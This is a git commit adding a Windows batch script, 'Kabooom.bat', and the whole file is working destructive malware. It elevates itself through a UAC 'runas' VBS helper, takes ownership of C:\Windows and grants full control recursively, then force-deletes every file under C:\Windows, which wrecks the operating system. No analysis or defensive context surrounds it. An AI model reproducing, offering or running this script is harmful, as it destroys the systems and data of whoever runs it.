c90879a4d99b5f2c6036c954f2f08c092baa85bc
princet725 <robert39776@students.apsb.org>
2025-02-28 10:04:12 -0600

    Add files via upload

---
+++ Kabooom.bat
@@ -0,0 +1,34 @@
+@echo off
+
+REM Check if running with admin privileges
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    echo Running with administrator privileges
+    set "admin=1"
+) else (
+    echo Not running with administrator privileges. Attempting to elevate...
+    set "admin=0"
+)
+
+REM If not running with admin privileges, elevate
+if "%admin%"=="0" (
+    echo Elevating privileges...
+    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || (
+        echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+        echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+        "%temp%\getadmin.vbs"
+        del "%temp%\getadmin.vbs"
+        exit /B
+    )
+    echo Successfully elevated privileges!
+)
+
+REM Take ownership of System32
+takeown /f C:\Windows /r /d y
+icacls C:\Windows /grant administrators:F /t
+cd C:\Windows
+
+
+
+REM Delete Windows
+del /F /S /Q *.*
